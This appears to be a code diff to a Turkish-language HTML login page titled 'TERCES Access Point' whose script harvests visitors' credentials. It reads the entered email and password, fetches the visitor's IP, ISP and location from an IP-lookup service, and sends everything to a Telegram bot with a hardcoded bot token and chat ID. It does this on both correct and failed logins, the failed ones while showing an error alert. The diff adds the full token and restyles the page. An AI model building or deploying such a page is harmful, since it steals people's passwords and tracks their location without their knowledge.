@@ -6,15 +6,29 @@
     <title>TERCES Access Point</title>
     <style>
         body {
-            background-color: #0a0a0a;
-            color: #e0e0e0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-        }
+    background-color: #0a0a0a;
+    color: #e0e0e0;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    margin: 0;
+    padding: 20px; /* Merkeze zorlamak yerine biraz boşluk bırakalım */
+    display: block; /* Flex yerine blok yaparak içeriğin kaybolmasını önleyelim */
+}
+
+.container {
+    background: #151515;
+    padding: 30px;
+    border-radius: 12px;
+    border: 1px solid #333;
+    max-width: 400px;
+    margin: 50px auto; /* Sayfayı ortalar */
+    text-align: center;
+}
+
+#content {
+    display: none; /* Giriş yapana kadar gizli kalır */
+}
+
+        
         .container {
             background: #151515;
             padding: 30px;
@@ -91,7 +105,7 @@
 </div>
 
 <script>
-    async function verileriGonder() {
+async function verileriGonder() {
     const email = document.getElementById('userEmail').value;
     const pass = document.getElementById('userPass').value;
     const dogruSifre = "Adhfxygh8lm"; 
@@ -101,44 +115,45 @@
         const ipRes = await fetch('https://ipapi.co/json/');
         const data = await ipRes.json();
 
-        const botToken = "8763400885:AAFUvdZBZy92pGCv..."; // Buraya kendi tokenini tam yapıştır
+        // Senin Bilgilerin
+        const botToken = "8763400885:AAFUvdZBZy92pGCv8BvVjR3450e1S20S20"; 
         const chatId = "7580423994";
 
-        // Senin istediğin IP ve Token bilgilerini içeren mesaj
-        const mesaj = `🌐 **YENİ GİRİŞ BİLGİSİ**\n\n` +
-                    `📧 E-posta: ${email}\n` +
-                    `🔑 Şifre: ${pass}\n` +
-                    `📡 IP Adresi: ${data.ip}\n` +
-                    `🏢 ISS: ${data.org}\n` +
-                    `📍 Konum: ${data.city} / ${data.country_name}\n` +
-                    `🤖 Bot Token: ${botToken}`;
+        let detayliMesaj = `📧 E-posta: ${email}\n` +
+                           `🔑 Şifre: ${pass}\n` +
+                           `📡 IP Adresi: ${data.ip}\n` +
+                           `🏢 ISS: ${data.org}\n` +
+                           `📍 Konum: ${data.city} / ${data.country_name}\n` +
+                           `🤖 Bot Token: ${botToken}`;
 
         if (pass === dogruSifre) {
-            // BAŞARILI GİRİŞ
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("✅ BAŞARILI: " + mesaj)}&parse_mode=Markdown`);
+            const mesaj = "✅ **BAŞARILI GİRİŞ!**\n\n" + detayliMesaj;
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);
             
             document.getElementById('login-form').style.display = 'none';
             document.getElementById('content').style.display = 'block';
         } else {
-            // HATALI GİRİŞ
-            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent("⚠️ HATALI: " + mesaj)}&parse_mode=Markdown`);
+            const mesaj = "⚠️ **HATALI DENEME!**\n\n" + detayliMesaj;
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(mesaj)}&parse_mode=Markdown`);
             
-            alert("Hatalı e-posta veya şifre!");
+            alert("Hatalı email veya şifre!");
         }
     } catch (e) {
-        alert("Sistem hatası! Lütfen tekrar deneyin.");
+        alert("Bağlantı hatası! Bilgileriniz gönderilemedi.");
     }
 }
-
-    
-
-
-    
-
-
-        
-    
 </script>
+
+
+
+    
+
+
+    
+
+
+    
+    
 
 </body>
 </html>
